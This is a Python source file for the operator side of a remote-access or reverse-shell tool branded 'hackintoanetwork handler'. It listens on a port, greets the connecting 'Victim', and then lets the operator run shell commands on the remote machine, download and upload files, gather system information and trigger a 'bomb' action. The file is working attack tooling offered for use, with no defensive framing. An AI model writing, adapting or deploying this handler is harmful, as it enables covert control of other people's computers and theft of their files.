# server.py
import os
import socket

def logo():
    print("""\033[1;36m
    ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
    ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
    ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
    ┬ ┬┌─┐┌┐┌┌┬┐┬  ┌─┐┬─┐
    ├─┤├─┤│││ │││  ├┤ ├┬┘
    ┴ ┴┴ ┴┘└┘─┴┘┴─┘└─┘┴└─""")
    print('')
    print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
    print('')

def server_connect():
    global sock
    global conn
    global addr
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LHOST, LPORT))
    sock.listen()
    conn, addr = sock.accept()

def Victim():
    print("\n\033[1;36m [+] Connected to\033[1;m", addr)
    print('')

if __name__=="__main__":

    logo()

    LHOST = "127.0.0.1"
    LPORT = (input(" PORT : \033[1;36m"))
    if LPORT == '':
        print(" \033[1;mDEFAULT PORT -> \033[1;36m4444\033[1;m")
        LPORT = 4444
    LPORT = int(LPORT)
    intBuff = 2048
    print("")
    print("\033[1;36m [+] Waiting for Connection...")
    server_connect()
    Victim()
    try:
        while True:
                
            header = conn.recv(intBuff).decode("utf-8","ignore")
            command = input(header)

            if command == "download":
                conn.send(command.encode())
                print("")
                file_path = input(str("ENTER THE FILE PATH : "))
                conn.send(file_path.encode())
                recv_file = conn.recv(65535)
                print("")
                file_name = input(str("ENTER THE FILE NAME : "))
                new_file = open(file_name, "wb")
                new_file.write(recv_file)
                new_file.close()
                print("")
                print(file_name, " Has been downloaded and saved\n")
                print("")
                    
            elif command == "upload": 
                conn.send(command.encode())
                file = input(str("ENTER THE FILE NAME : "))
                print("")
                file_name = input(str("ENTER THE FILE NAME FOR THE FILE BE SAVED : "))
                print("")
                data = open(file, "rb")
                file_data = data.read(7000)
                conn.send(file_name.encode())
                print("")
                print(file, "HAS BEEN SENT SUCCESSFULLY\n")
                print("")
                conn.send(file_data)

            elif command == "sysinfo":
                conn.send(command.encode())
                system_data = conn.recv(intBuff).decode()
                print(system_data)

            elif command == "help":
                conn.send(command.encode())
                guide = conn.recv(intBuff).decode()
                print(guide)

            elif command == "bomb":
                conn.send(command.encode())
                res = conn.recv(intBuff).decode()
                print(res)

                

            else:
                conn.send(command.encode())
                data = conn.recv(65535).decode("euc-kr")
                if data == "exit":
                    sock.close()
                    break
                print(data)

    except BrokenPipeError:
        time.sleep
